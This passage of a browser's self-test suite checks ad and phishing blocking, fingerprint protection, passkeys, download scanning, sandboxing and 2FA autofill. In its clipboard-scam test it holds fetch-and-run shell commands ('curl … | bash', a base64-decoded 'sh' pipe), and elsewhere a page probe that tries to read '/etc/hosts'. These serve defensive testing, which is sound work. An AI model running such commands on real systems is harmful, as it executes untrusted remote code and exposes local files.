      const base = ${JSON.stringify(themes.get('midnight-aurora'))};
      for (const kind of VRKBackground.effects) {
        for (const type of ['keyframes', 'gradient']) {
          try {
            const stop = VRKBackground.mount(box, { ...base, background: { ...base.background, type, effect: { ...base.background.effect, kind } } });
            await new Promise((r) => setTimeout(r, 120));
            stop();
          } catch (e) { errors.push(kind + ': ' + e.message); }
        }
      }
      box.remove();
      return errors;
    })()`);
    check('Every animated effect runs', effectErrors.length === 0, effectErrors.join('; ') || `${10} effects × 2 backgrounds`);
    browser.openInternal('themes');
    await wait(900);
    const cards = await browser.ui.executeJavaScript(`document.querySelectorAll('#themepanel .te-card').length`);
    check('Theme editor shows every theme', cards === themes.list().length, `${cards} cards`);
    const customBefore = themes.list().length;
    await browser.ui.executeJavaScript(`[...document.querySelectorAll('#themepanel .te-card')].find((c) => c.textContent.includes('Neon Synthwave')).click()`);
    await wait(300);
    await browser.ui.executeJavaScript(`(() => { const color = document.querySelector('#themepanel .te-panel input[type=color]'); color.value = '#00ff99'; color.dispatchEvent(new Event('input', { bubbles: true })); })()`);
    await wait(300);
    const copyName = await browser.ui.executeJavaScript(`document.querySelector('#themepanel .te-name').value`);
    check('Editing a built-in theme makes your own copy', copyName.includes('my copy'), copyName);
    await browser.ui.executeJavaScript(`[...document.querySelectorAll('#themepanel .te-top .btn')].find((b) => b.textContent === 'Save').click()`);
    await wait(800);
    const savedCopy = themes.list().find((t) => t.name === copyName);
    check('Saving keeps the edit', themes.list().length === customBefore + 1 && savedCopy?.colors.accent === '#00ff99', savedCopy?.colors.accent);
    const exported = path.join(os.tmpdir(), `vrk-theme-${process.pid}.vrktheme`);
    themes.exportTheme(custom.id, exported);
    const reimported = themes.importTheme(exported);
    fs.rmSync(exported, { force: true });
    check('Themes export and import with their media', reimported.id !== custom.id && reimported.background.media && reimported.background.media !== custom.background.media && themes.mediaPath(reimported.background.media));
    settings.set('themeId', 'classic');
    await wait(400);
    check('Switching back to VRK Classic', !(await browser.ui.executeJavaScript(`document.body.dataset.custom || ''`)) && (await browser.ui.executeJavaScript(`document.querySelector('#app-bg').children.length`)) === 0);
    let splashHidden = false;
    for (let i = 0; i < 20 && !splashHidden; i += 1) {
      splashHidden = await browser.ui.executeJavaScript(`document.getElementById('splash').hidden`);
      if (!splashHidden) await wait(100);
    }
    check('Opening animation is skipped when turned off', splashHidden);

    // ── 15. Ad/telemetry servers, aggressive blocking, dangerous sites ──
    {
      const page = await open(`${local}/headers`);
      const before = shield.totalBlocked;
      await js(page, `Promise.allSettled(['https://data.mistat.xiaomi.com/', 'https://iadsdk.apple.com/', 'https://adsfs.oppomobile.com/'].map((u) => fetch(u, { mode: 'no-cors' })))`);
      await wait(300);
      check('Ad and telemetry servers are blocked (HaGeZi list)', shield.totalBlocked - before >= 3 && shield.hostlist.size > 100000, `${shield.totalBlocked - before} of 3 blocked, ${shield.hostlist.size} domains listed`);
      browser.closeTab(page.id);

      const bait = async () => {
        const tab = await open(`${local}/bait`);
        const result = await js(tab, `({ hidden: document.getElementById('bait').offsetHeight === 0, script: window.baitLoaded === true })`);
        browser.closeTab(tab.id);
        return result;
      };
      const standard = await bait();
      settings.set('blockBait', true);
      const aggressive = await bait();
      settings.set('blockBait', false);
      check('Standard blocking leaves anti-adblock decoys alone', !standard.hidden && standard.script, JSON.stringify(standard));
      check('Aggressive blocking stops decoy ads and scripts', aggressive.hidden && !aggressive.script, JSON.stringify(aggressive));

      const { parseList, Safety } = require('../src/safety');
      const parsed = parseList('! comment\nevil.example\n||cdn.example.org/pay/login.php^$all\n||1.2.3.4^\n');
      const unit = new Safety({});
      unit.use({ updatedAt: 1, lists: { phishing: parsed } });
      check(
        'Dangerous-site lists match hosts, subdomains and exact paths',
        unit.check('https://evil.example/x') === 'phishing' &&
          unit.check('https://a.b.evil.example/') === 'phishing' &&
          unit.check('https://cdn.example.org/pay/login.php?x=1') === 'phishing' &&
          unit.check('https://cdn.example.org/pay/login.phpx') === null &&
          unit.check('https://cdn.example.org/other') === null &&
          unit.check('http://1.2.3.4/') === 'phishing' &&
          unit.check('https://notevil.example/') === null,
      );
      check('Phishing and malware lists are loaded', shield.safety.count > 1000, `${shield.safety.count} entries`);

      shield.safety.hosts.set('phish.vrk-selftest.example', 'phishing');
      const danger = await open('https://phish.vrk-selftest.example/login');
      await wait(400);
      const panel = await browser.ui.executeJavaScript(`({ shown: !document.getElementById('errpanel').hidden, red: document.getElementById('errpanel').classList.contains('danger'), title: document.getElementById('err-title').textContent, back: document.getElementById('err-retry').textContent })`);
      check('Phishing sites are stopped with a red warning page', danger.error?.danger === 'phishing' && panel.shown && panel.red && panel.title === 'Deceptive site ahead' && panel.back === 'Back to safety', JSON.stringify(panel));
      browser.leaveDangerousSite();
      await wait(300);
      check('“Back to safety” leaves the dangerous page', !danger.error && danger.isNewTab);
      browser.loadInTab(danger, 'https://phish.vrk-selftest.example/login');
      await waitIdle(danger);
      browser.visitDangerousSite();
      await waitIdle(danger);
      check('“Visit anyway” works for that site only', !danger.error?.danger && danger.profile.dangerAllowed.has('phish.vrk-selftest.example'));
      danger.profile.dangerAllowed.clear();
      shield.safety.hosts.delete('phish.vrk-selftest.example');
      browser.closeTab(danger.id);
      check('Default-browser setting is offered (installed app only)', browser.defaultBrowserStatus().canSet === app.isPackaged);
    }

    // ── 16. Fingerprint randomizing & Tor hardening ──
    {
      const reading = async (url) => {
        const tab = await open(url);
        const result = await js(tab, 'fp()');
        browser.closeTab(tab.id);
        return result;
      };
      settings.set('fingerprintProtection', false);
      const raw = await reading(`${local}/fp`);
      settings.set('fingerprintProtection', true);
      const siteA = await reading(`${local}/fp`);
      const siteB = await reading(`http://localhost:${port}/fp`);
      check('Canvas fingerprints are randomized, differently per site', raw.a !== siteA.a && raw.a !== siteB.a && siteA.a !== siteB.a);
      check('A site sees one consistent fingerprint (page and its iframes)', siteA.a === siteA.b && siteA.same === siteA.a && siteA.blank === siteA.a);
      check('Audio fingerprints are randomized', typeof raw.audio === 'number' && raw.audio !== siteA.audio, `${raw.audio} → ${siteA.audio}`);
      check('CPU core count varies per site', siteA.cores >= 2 && siteA.cores <= raw.cores, `${raw.cores} → ${siteA.cores}, ${siteB.cores}`);
      check('Randomizing is invisible to tamper checks', /function toDataURL\(\) \{ \[native code\] \}/.test(siteA.native) && /function toString\(\) \{ \[native code\] \}/.test(siteA.native), siteA.native);

      const tz = await open(`${local}/headers`);
      browser.applyTorEmulation(tz.wc);
      await wait(300);
      const zone = await js(tz, `Intl.DateTimeFormat().resolvedOptions().timeZone + ' ' + new Date(0).getTimezoneOffset()`);
      check('Tor tabs report UTC time (as Tor Browser does)', zone === 'UTC 0', zone);
      browser.closeTab(tz.id);
      const levels = {};
      for (const level of ['standard', 'safer', 'safest']) {
        settings.set('torSecurity', level);
        levels[level] = ['http://example.com/', 'https://example.com/', 'http://duckduckgogg42xjoc72x3sjasowoarfbgcmvfimaftt6twagswzczad.onion/'].map((u) => shield.torScriptsBlocked(u));
      }
      settings.set('torSecurity', 'standard');
      check(
        'Tor security levels: Safer blocks scripts on non-HTTPS sites, Safest everywhere',
        JSON.stringify(levels) === JSON.stringify({ standard: [false, false, false], safer: [true, false, false], safest: [true, true, true] }),
        JSON.stringify(levels),
      );
    }

    // ── 17. Passkeys, strong passwords, breach checks ──
    {
      const swa = await import('@simplewebauthn/server');
      const origin = `http://localhost:${port}`;
      const challenge = () => crypto.randomBytes(32).toString('base64url');
      browser.passkeyApproval = async () => true; // stands in for Touch ID
      const page = await open(`${origin}/passkey`);
      browser.activate(page.id);
      const regChallenge = challenge();
      const reg = await js(page, `register(${JSON.stringify(regChallenge)})`);
      let registration = null;
      try {
        registration = await swa.verifyRegistrationResponse({ response: reg.json, expectedChallenge: regChallenge, expectedOrigin: origin, expectedRPID: 'localhost', requireUserVerification: true });
      } catch (err) {
        info('Registration verification', err.message);
      }
      check(
        'Creates passkeys that a standard WebAuthn server accepts',
        reg.ok && reg.isPKC && reg.alg === -7 && reg.ext?.credProps?.rk === true && registration?.verified && vault.passkeysFor('localhost').length === 1,
        reg.ok ? 'verified by SimpleWebAuthn' : reg.name,
      );
      const credentialInfo = registration?.registrationInfo?.credential;
      const authChallenge = challenge();
      const auth = await js(page, `login(${JSON.stringify(authChallenge)})`);
      let authentication = null;
      try {
        authentication = await swa.verifyAuthenticationResponse({
          response: auth.json,
          expectedChallenge: authChallenge,
          expectedOrigin: origin,
          expectedRPID: 'localhost',
          credential: credentialInfo,
          requireUserVerification: true,
        });
      } catch (err) {
        info('Sign-in verification', err.message);
      }
      check('Signs in with a passkey (signature verified)', auth.ok && auth.isPKC && authentication?.verified && auth.json.response.userHandle === 'dXNlci0x', auth.ok ? '' : auth.name);
      const again = await js(page, `register(${JSON.stringify(challenge())}, { exclude: [${JSON.stringify(reg.json?.id)}] })`);
      const foreign = await js(page, `register(${JSON.stringify(challenge())}, { rpId: 'example.com' })`);
      check('Refuses duplicate passkeys and other sites’ domains', again.name === 'InvalidStateError' && foreign.name === 'SecurityError', `${again.name}, ${foreign.name}`);
      browser.passkeyApproval = async () => null; // you cancel Touch ID
      const declined = await js(page, `login(${JSON.stringify(challenge())})`);
      browser.passkeyApproval = async () => true;
      check('Cancelling Touch ID cancels the sign-in', declined.name === 'NotAllowedError', declined.name);

      const condChallenge = challenge();
      await js(page, `conditional(${JSON.stringify(condChallenge)})`);
      await wait(300);
      await js(page, `document.getElementById('user').focus()`);
      await wait(600);
      const offered = await page.wc.executeJavaScriptInIsolatedWorld(999, [{ code: "document.querySelector('vrk-autofill')?.vrkItems || []" }]);
      if (offered.length) await page.wc.executeJavaScriptInIsolatedWorld(999, [{ code: "document.querySelector('vrk-autofill').vrkSelect(0)" }]);
      await wait(800);
      const cond = await js(page, 'window.condResult');
      let condVerified = null;
      try {
        condVerified = await swa.verifyAuthenticationResponse({ response: cond?.json, expectedChallenge: condChallenge, expectedOrigin: origin, expectedRPID: 'localhost', credential: credentialInfo, requireUserVerification: true });
      } catch {}
      check('Offers passkeys in the autofill list and signs in when picked', offered[0] === 'tester@example.com' && cond?.ok && condVerified?.verified, JSON.stringify(offered));
      browser.closeTab(page.id);
      for (const p of vault.passkeySummary()) vault.removePasskey(p.id);
      browser.passkeyApproval = null;

      const signup = await open(`${local}/signup`);
      browser.activate(signup.id);
      await js(signup, `document.getElementById('p1').focus()`);
      await wait(600);
      const suggestions = await signup.wc.executeJavaScriptInIsolatedWorld(999, [{ code: "document.querySelector('vrk-autofill')?.vrkItems || []" }]);
      if (suggestions.length) await signup.wc.executeJavaScriptInIsolatedWorld(999, [{ code: "document.querySelector('vrk-autofill').vrkSelect(0)" }]);
      await wait(300);
      const generated = await js(signup, `[document.getElementById('p1').value, document.getElementById('p2').value]`);
      check(
        'Suggests a strong password on sign-up forms and fills both fields',
        suggestions[0] === 'Use a strong password' && /^[a-zA-Z0-9]{5}(-[a-zA-Z0-9]{5}){3}$/.test(generated[0]) && generated[0] === generated[1],
        generated[0],
      );
      browser.closeTab(signup.id);

      if (!skip.has('net')) {
        const breached = await browser.breachCount('password123').catch((err) => `error: ${err.message}`);
        const fresh = await browser.breachCount(generated[0] || crypto.randomBytes(16).toString('hex')).catch((err) => `error: ${err.message}`);
        check('Breach check finds leaked passwords (k-anonymity)', breached > 1000 && fresh === 0, `password123: ${breached}, generated: ${fresh}`);
        const store = await Promise.all([
          browser.extensions.isListed('ddkjiahejlhfcafbddmgiahcphecmpfh', { source: 'chrome' }),
          browser.extensions.isListed('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa', { source: 'chrome' }),
          browser.extensions.isListed('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa', { source: 'edge' }),
          browser.extensions.isListed('x', { source: 'firefox', amo: 'vrk-no-such-add-on-xyz' }),
          browser.extensions.isListed('x', { source: 'firefox', amo: 'ublock-origin' }),
        ]).catch((err) => err.message);
        check('Extension safety check spots extensions their store removed', JSON.stringify(store) === JSON.stringify([true, false, false, false, true]), JSON.stringify(store));
        const fetchedLists = await shield.refreshLists({ force: true }).then(() => true, (err) => err.message);
        check('Ad, telemetry and dangerous-site lists download and refresh', fetchedLists === true && shield.hostlist.size > 100000 && shield.safety.count > 1000, String(fetchedLists));
      }
    }

    // ── 18. Web pages can't reach VRK itself ──
    {
      const page = await open(`${local}/headers`);
      const prefs = page.wc.getLastWebPreferences();
      check('Tabs are sandboxed and context-isolated, without Node.js', prefs.sandbox && prefs.contextIsolation && !prefs.nodeIntegration && prefs.webSecurity !== false);
      const probe = await js(page, `(async () => {
        const globals = ['require', 'process', 'ipcRenderer', 'vrk', 'electron', 'module'].filter((name) => name in window);
        const internal = await fetch('vrk://ui/index.html').then(() => 'loaded', () => 'blocked');
        const local = await fetch('file:///etc/hosts').then(() => 'loaded', () => 'blocked');
        return { globals, internal, local };
      })()`);
      const tabsBefore = browser.order.length;
      await js(page, `window.open('file:///etc/hosts'); window.open('vrk://settings');`);
      await js(page, `location.href = 'vrk://settings'`);
      await wait(600);
      check(
        'Web pages can’t reach VRK’s internals, local files or Node.js',
        probe.globals?.length === 0 && probe.internal === 'blocked' && probe.local === 'blocked' && browser.order.length === tabsBefore && page.url.startsWith(local) && !page.internal,
        JSON.stringify(probe),
      );
      // Pretend a (compromised) web page sent VRK's private requests: they must be refused.
      const { ipcMain } = require('electron');
      const handler = ipcMain._invokeHandlers?.get('vrk:settings:get');
      let answer = 'no handler';
      if (handler) {
        try {
          await handler({ sender: page.wc, senderFrame: page.wc.mainFrame });
          answer = 'answered';
        } catch (err) {
          answer = `refused: ${err.message}`;
        }
      }
      check('Web pages can’t use VRK’s private controls, even with their own bridge', answer.startsWith('refused'), answer);
      browser.closeTab(page.id);
    }

    // ── 19. Importing from Firefox when macOS guards its folder ──
    {
      const firefoxBase = path.join(os.homedir(), 'Library', 'Application Support', 'Firefox');
      const found = importer.detect();
      const ff = found.find((b) => b.id === 'firefox');
      check('Firefox is listed (or marked as needing permission), never silently missing', !fs.existsSync(firefoxBase) || Boolean(ff && (ff.profiles.length || ff.blocked)), ff ? (ff.blocked ? 'blocked by macOS: offers the folder picker' : `${ff.profiles.length} profile(s)`) : 'not installed');
      // A Firefox folder whose profile isn't in profiles.ini (newer layout), picked by hand.
      const root = fs.mkdtempSync(path.join(os.tmpdir(), 'vrk-ff-'));
      const profileDir = path.join(root, 'Profiles', 'abcd1234.default-release');
      fs.mkdirSync(profileDir, { recursive: true });
      const { DatabaseSync } = require('node:sqlite');
      const db = new DatabaseSync(path.join(profileDir, 'places.sqlite'));
      db.exec(`CREATE TABLE moz_places (id INTEGER PRIMARY KEY, url TEXT);
        CREATE TABLE moz_bookmarks (id INTEGER PRIMARY KEY, type INTEGER, fk INTEGER, parent INTEGER, position INTEGER, title TEXT, guid TEXT);
        INSERT INTO moz_places VALUES (1, 'https://www.mozilla.org/');
        INSERT INTO moz_bookmarks VALUES (1, 2, NULL, 0, 0, '', 'root________'), (2, 2, NULL, 1, 0, 'toolbar', 'toolbar_____'), (3, 1, 1, 2, 0, 'Mozilla', 'aaaaaaaaaaaa');`);
      db.close();
      let picked = null;
      try {
        picked = importer.addProfileFolder('firefox', root);
      } catch (err) {
        picked = err.message;
      }
      const imported = Array.isArray(picked) ? await importer.importBrowser({ browserId: 'firefox', profileId: picked[0].id, what: { bookmarks: true }, session: browser.normal.session }) : null;
      check('Imports from a Firefox profile folder you pick', imported?.bookmarks === 1 && !imported.errors.length, JSON.stringify(imported || picked));
      let wrongFolder = '';
      try {
        importer.addProfileFolder('firefox', os.tmpdir());
      } catch (err) {
        wrongFolder = err.message;
      }
      check('Explains how to find the right folder', /about:support/.test(wrongFolder), wrongFolder.slice(0, 80));
      fs.rmSync(root, { recursive: true, force: true });
      for (const node of [...bookmarks.walk()]) if (node.url === 'https://www.mozilla.org/' || /Imported from Firefox/.test(node.title || '')) bookmarks.remove(node.id);
    }

    // ── 20. Download protection ──
    {
      const dlDir = fs.mkdtempSync(path.join(os.tmpdir(), 'vrk-dl-'));
      const fetchDownload = (name, body) =>
        new Promise((resolve) => {
          const done = (file) => setTimeout(() => resolve(file), 600); // VRK's own 'done' handler runs first
          browser.normal.session.once('will-download', (_e, item) => {
            const file = path.join(dlDir, name);
            item.setSavePath(file);
            item.once('done', () => done(file));
          });
          browser.createTab(`${local}/dl/${name}?body=${encodeURIComponent(body)}`, { background: true });
        });
      const file = await fetchDownload('tool.dmg', 'harmless test file');
      const attrs = require('node:child_process').execFileSync('/usr/bin/xattr', ['-l', file]).toString();
      check('Downloads get macOS’s quarantine flag and “Where from”', /com\.apple\.quarantine: 0083;[0-9a-f]+;VRK;/.test(attrs) && /kMDItemWhereFroms/.test(attrs), attrs.split('\n').map((l) => l.split(':')[0]).filter(Boolean).join(', '));
      const evil = 'pretend this is malware';
      shield.malware.hashes.set(crypto.createHash('sha256').update(evil).digest('hex'), Math.floor(Date.now() / 86400000));
      const bad = await fetchDownload('invoice.pkg', evil);
      check('Downloads matching known malware are deleted', !fs.existsSync(bad));
      let cancelled = false;
      browser.trackDownload({ getURL: () => 'http://example.com/setup.pkg', getFilename: () => 'setup.pkg', cancel: () => (cancelled = true) }, false);
      check('Installers over plain HTTP are refused', cancelled);
      for (const tab of [...browser.tabs.values()]) if (tab.url.includes('/dl/')) browser.closeTab(tab.id);
      fs.rmSync(dlDir, { recursive: true, force: true });
    }

    // ── 21. "Paste into Terminal" scam guard ──
    {
      const page = await open(`${local}/headers`);
      const copied = async (code) => {
        browser.lastClipboardWarning = null;
        await js(page, code);
        await wait(400);
        return browser.lastClipboardWarning?.text || null;
      };
      // DataTransfer.setData goes through the same guard without touching your real clipboard.
      const command = await copied(`new DataTransfer().setData('text/plain', 'curl -fsSL https://example.com/verify.sh | bash')`);
      const inFrame = await copied(`(() => { const f = document.createElement('iframe'); document.body.append(f); new f.contentWindow.DataTransfer().setData('text/plain', 'echo Y3VybA== | base64 -d | sh'); })()`);
      const harmless = await copied(`new DataTransfer().setData('text/plain', 'Meet me at 5pm by the library.')`);
      check('Warns when a site copies a Terminal command (also from iframes), not ordinary text', /curl/.test(command || '') && /base64/.test(inFrame || '') && harmless === null);
      browser.closeTab(page.id);
    }

    // ── 22. Lookalike sites & password reuse ──
    {
      const fake = await open('https://paypa1.com/signin');
      await wait(300);
      const shown = await browser.ui.executeJavaScript(`({ title: document.getElementById('err-title').textContent, go: document.getElementById('err-retry').textContent })`);
      check('Lookalike sites are stopped, with a way to the real site', fake.error?.danger === 'lookalike' && shown.title === 'This isn’t paypal.com' && shown.go === 'Go to paypal.com', JSON.stringify(shown));
      browser.closeTab(fake.id);
      const { lookalikeOf } = require('../src/lookalike');
      const { domainToASCII } = require('node:url');
      const caught = ['g00gle.com', 'rnicrosoft.com', 'amazom.com', 'apple-id-verify.com', domainToASCII('аpple.com')].every((d) => lookalikeOf(d));
      const spared = ['google.com', 'mail.google.com', 'apple.de', 'github.com', 'nytimes.com', 'bookings.com', 'discordapp.com', 'googleusercontent.com'].every((d) => !lookalikeOf(d));
      check('Catches look-alike letters, other alphabets and typos without flagging real sites', caught && spared);

      vault.upsert({ origin: 'https://bank.example', username: 'me', password: 'unique-bank-password-123' });
      const page = await open(`${local}/login`);
      browser.activate(page.id);
      await js(page, `document.getElementById('user').value = 'me'; document.getElementById('pass').value = 'unique-bank-password-123'; document.getElementById('go').click();`);
      await wait(500);
      check('Warns when a saved password is typed into a different site', browser.reuseWarned?.has('127.0.0.1|bank.example'));
      for (const [id, offer] of browser.passwordOffers) if (offer.password === 'unique-bank-password-123') browser.passwordOffers.delete(id);
      vault.remove(vault.forOrigin('https://bank.example')[0].id);
      browser.closeTab(page.id);
    }

    // ── 23. Per-site JavaScript & App lock ──
    {
      const title = async () => {
        const tab = await open(`${local}/js`);
        const t = tab.title || (await js(tab, 'document.title'));
        browser.closeTab(tab.id);
        return t;
      };
      settings.setSite('jsBlockedSites', '127.0.0.1', true);
      const blocked = await title();
      settings.setSite('jsBlockedSites', '127.0.0.1', false);
      const allowed = await title();
      check('JavaScript can be turned off per site', blocked === 'no script' && allowed === 'script ran', `${blocked} / ${allowed}`);

      settings.set('appLock', true);
      browser.unlockApproval = async () => true; // stands in for Touch ID
      const page = await open(`${local}/headers`);
      browser.lock();
      await wait(400);
      const { ipcMain } = require('electron');
      let historyWhileLocked = 'answered';
      try {
        await ipcMain._invokeHandlers.get('vrk:history:list')({ sender: browser.ui, senderFrame: browser.ui.mainFrame });
      } catch (err) {
        historyWhileLocked = err.message;
      }
      const lockShown = await browser.ui.executeJavaScript(`!document.getElementById('lockscreen').hidden`);
      check(
        'App lock hides pages, tab titles and history until unlocked',
        browser.locked && lockShown && browser.attached === null && browser.win.getTitle() === 'VRK' && browser.recentHistoryItems(5).length === 0 && historyWhileLocked === 'VRK is locked.',
        historyWhileLocked,
      );
      await browser.unlock();
      await wait(300);
      check('Unlocking (Touch ID) brings everything back', !browser.locked && browser.attached === page.view && !(await browser.ui.executeJavaScript(`!document.getElementById('lockscreen').hidden`)));
      settings.set('appLock', false);
      browser.unlockApproval = null;
      browser.closeTab(page.id);
    }

    // ── 24. Extension site access ──
    {
      const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'vrk-ext-access-'));
      fs.writeFileSync(path.join(dir, 'manifest.json'), JSON.stringify({ manifest_version: 3, name: 'VRK Access Test', version: '1.0', content_scripts: [{ matches: ['<all_urls>'], js: ['cs.js'], run_at: 'document_start' }] }));
      fs.writeFileSync(path.join(dir, 'cs.js'), "document.documentElement.dataset.vrkAccess = 'ran';");
      const ext = await browser.extensions.installFile(dir);
      const ranOn = async (url) => {
        const tab = await open(url);
        const ran = (await js(tab, 'document.documentElement.dataset.vrkAccess || ""')) === 'ran';
        browser.closeTab(tab.id);
        return ran;
      };
      const before = await ranOn(`${local}/headers`);
      settings.setSite('extensionBlockedSites', '127.0.0.1', true);
      await wait(1500);
      const protectedSite = await ranOn(`${local}/headers`);
      settings.setSite('extensionBlockedSites', '127.0.0.1', false);
      await wait(1500);
      await browser.extensions.setSiteAccess(ext.id, 'list', ['localhost']);
      await wait(1500);
      const onlyChosen = [await ranOn(`${local}/headers`), await ranOn(`http://localhost:${port}/headers`)];
      check('Extensions stay off protected sites', before && !protectedSite, `${before} → ${protectedSite}`);
      check('An extension can be limited to sites you choose', !onlyChosen[0] && onlyChosen[1], JSON.stringify(onlyChosen));
      await browser.extensions.remove(browser.extensions.list().find((e) => e.name === 'VRK Access Test')?.id || ext.id);
      fs.rmSync(dir, { recursive: true, force: true });
    }

    // ── 25. Network & permissions ──
    {
      const torrc = tor.buildTorrc({ socksPort: 9150, controlPort: 9151, dataDir: '/tmp/vrk-tor-test' });
      check('Tor uses a separate circuit per site', /SocksPort 127\.0\.0\.1:9150 IsolateDestAddr/.test(torrc));

      let verdict = null;
      const fakeRequest = (host, knownRoot) => ({
        hostname: host,
        errorCode: 0,
        isIssuedByKnownRoot: knownRoot,
        validatedCertificate: { subject: { commonName: 'leaf' }, issuerCert: { subject: { organizations: ['Example School Filter'], commonName: 'Example School Root CA' }, issuerCert: null } },
      });
      shield.onVerifyCertificate(browser.normal, fakeRequest('www.example.com', true), (v) => (verdict = v));
      const quietForPublicRoots = !browser.interceptions?.size && verdict === -3;
      shield.onVerifyCertificate(browser.normal, fakeRequest('www.example.com', false), (v) => (verdict = v));
      check('Spots HTTPS inspection (and still lets Chromium decide)', quietForPublicRoots && browser.interceptions?.has('Example School Filter') && verdict === -3);
      browser.interceptions.clear();

      let asked = false;
      const askBefore = shield.askPermission;
      shield.askPermission = async () => (asked = true);
      const notified = await new Promise((resolve) => shield.onPermissionRequest(browser.normal, null, 'notifications', resolve, { requestingUrl: 'https://example.com/' }));
      shield.askPermission = askBefore;
      check('Notification prompts are blocked without bothering you', notified === false && !asked);

      browser.normal.grants.set('https://example.com|geolocation', true);
      const listed = browser.listPermissions().some((p) => p.origin === 'https://example.com' && p.permission === 'geolocation' && p.allowed);
      browser.revokePermission('https://example.com|geolocation', false);
      check('Site permissions can be listed and reset', listed && !browser.normal.grants.has('https://example.com|geolocation'));

      const dnsChecks = [
        settings.set('dnsCustomUrl', 'http://dns.example/dns-query') === false,
        settings.set('dnsCustomUrl', 'https://dns.example/dns-query') === true,
        settings.set('nextdnsId', 'not valid!') === false,
        settings.set('nextdnsId', 'abc123') === true,
        settings.set('dnsProvider', 'mullvad') === true,
      ];
      settings.set('dnsProvider', 'quad9');
      settings.set('dnsCustomUrl', '');
      settings.set('nextdnsId', '');
      check('You can choose your encrypted DNS (only https:// servers)', dnsChecks.every(Boolean), JSON.stringify(dnsChecks));
    }

    // ── 26. Container tabs ──
    {
      const school = await open(`${local}/headers`, { container: 'school' });
      const plain = await open(`${local}/headers`);
      await js(school, `document.cookie = 'who=school; path=/'`);
      await js(plain, `document.cookie = 'who=personal; path=/'`);
      const cookies = [await js(school, 'document.cookie'), await js(plain, 'document.cookie')];
      check(
        'Container tabs keep their own cookies',
        school.container === 'school' && school.wc.session !== plain.wc.session && /who=school/.test(cookies[0]) && !/personal/.test(cookies[0]) && /who=personal/.test(cookies[1]) && !/school/.test(cookies[1]),
        JSON.stringify(cookies),
      );
      const fp = async (tab) => js(tab, `(() => { const c = document.createElement('canvas'); c.width = 60; c.height = 20; const x = c.getContext('2d'); x.fillStyle = '#f60'; x.fillRect(0, 0, 60, 20); x.fillStyle = '#069'; x.font = '12px Arial'; x.fillText('vrk', 4, 14); return c.toDataURL(); })()`);
      check('Each container shows sites a different fingerprint', (await fp(school)) !== (await fp(plain)));
      const state = browser.snapshot().tabs.find((t) => t.id === school.id);
      check('Container tabs are labeled with their container', state.container?.name === 'School');
      browser.closeTab(school.id);
      browser.closeTab(plain.id);
      const id = browser.addContainer('Banking', 'green');
      const added = settings.get('containers').some((c) => c.id === id && c.name === 'Banking');
      await browser.removeContainer(id);
      check('Containers can be added and deleted', added && !settings.get('containers').some((c) => c.id === id));
    }

    // ── 27. Redirects, referrers, cookie banners, forgetting sites ──
    {
      const hop = await open(`https://www.google.com/url?q=${encodeURIComponent(`${local}/headers`)}&sa=D`);
      check('Skips tracking redirects (google.com/url → the real link)', hop.url.startsWith(`${local}/headers`), hop.url);
      browser.closeTab(hop.id);

      const page = await open(`${local}/refer?secret=path`);
      await js(page, `fetch('http://localhost:${port}/seen', { mode: 'no-cors' }).catch(() => {})`);
      await wait(300);
      check('Other sites see only where you came from, not the page', lastReferer === `${local}/`, String(lastReferer));
      browser.closeTab(page.id);

      const banner = await open(`${local}/banner`);
      await wait(2500);
      const clicked = await js(banner, `({ rejected: window.rejected, accepted: window.accepted || false })`);
      browser.closeTab(banner.id);
      const late = await open(`${local}/late-banner`);
      // Hidden test windows run timers about once a second, so give the late banner time.
      for (let i = 0; i < 40 && !(await js(late, 'window.lateRejected || false')); i += 1) await wait(150);
      const lateClicked = await js(late, 'window.lateRejected || false');
      browser.closeTab(late.id);
      const other = await open(`${local}/not-a-banner`);
      await wait(800);
      const leftAlone = !(await js(other, 'window.declined || false'));
      browser.closeTab(other.id);
      check('Rejects cookie banners (known platforms and late ones), nothing else', clicked.rejected === 'onetrust' && !clicked.accepted && lateClicked && leftAlone, JSON.stringify({ clicked, lateClicked, leftAlone }));

      settings.set('forgetOnClose', true);
      browser.forgetDelay = 300;
      const site = await open(`http://localhost:${port}/headers`);
      await js(site, `document.cookie = 'remember=me; path=/'; localStorage.setItem('k', 'v')`);
      browser.closeTab(site.id);
      await wait(1200);
      const leftover = (await browser.normal.session.cookies.get({})).filter((c) => c.domain.replace(/^\./, '') === 'localhost' && c.name === 'remember');
      check('Forgets a site’s cookies when you close its last tab', leftover.length === 0, `${leftover.length} left`);
      settings.set('forgetOnClose', false);
      browser.forgetDelay = undefined;
    }

    // ── 28. Two-factor codes ──
    {
      const { totpCode, parseTotp } = require('../src/totp');
      const rfcSecret = 'GEZDGNBVGY3TQOJQGEZDGNBVGY3TQOJQ'; // "12345678901234567890", RFC 6238
      const vectors = [[59, '94287082'], [1111111109, '07081804'], [1234567890, '89005924'], [2000000000, '69279037']];
      check('2FA codes match the RFC 6238 test vectors', vectors.every(([t, code]) => totpCode({ secret: rfcSecret, digits: 8 }, t * 1000).code === code));

      const otpauth = 'otpauth://totp/Example:me@example.com?secret=JBSWY3DPEHPK3PXP&issuer=Example';
      const qr = require('qrcode');
      const { nativeImage } = require('electron');
      const qrImage = nativeImage.createFromDataURL(await qr.toDataURL(otpauth, { margin: 4, scale: 6 }));
      check('Reads 2FA QR codes', browser.decodeQr(qrImage) === otpauth && parseTotp(otpauth).issuer === 'Example');

      vault.upsert({ origin: local, username: 'me', password: 'pw-for-2fa-test' });
      const login = vault.forOrigin(local).find((l) => l.username === 'me');
      const saved = browser.setLoginTotp(login.id, otpauth);
      const fillFrom = async (route, read) => {
        const page = await open(`${local}${route}`);
        browser.activate(page.id);
        await js(page, `document.querySelector('input').focus()`);
        await wait(600);
        const items = await page.wc.executeJavaScriptInIsolatedWorld(999, [{ code: "document.querySelector('vrk-autofill')?.vrkItems || []" }]);
        if (items.length) await page.wc.executeJavaScriptInIsolatedWorld(999, [{ code: "document.querySelector('vrk-autofill').vrkSelect(0)" }]);
        await wait(400);
        const value = await js(page, read);
        browser.closeTab(page.id);
        return { items, value };
      };
      const single = await fillFrom('/otp', `document.getElementById('otp').value`);
      const boxes = await fillFrom('/otp-boxes', `[...document.querySelectorAll('.d')].map((i) => i.value).join('')`);
      const expected = [totpCode(parseTotp(otpauth), Date.now() - 2000).code, totpCode(parseTotp(otpauth)).code];
      check(
        'Fills 2FA codes into code fields (also split digit boxes)',
        saved.ok && /^2FA code/.test(single.items[0] || '') && expected.includes(single.value) && expected.includes(boxes.value),
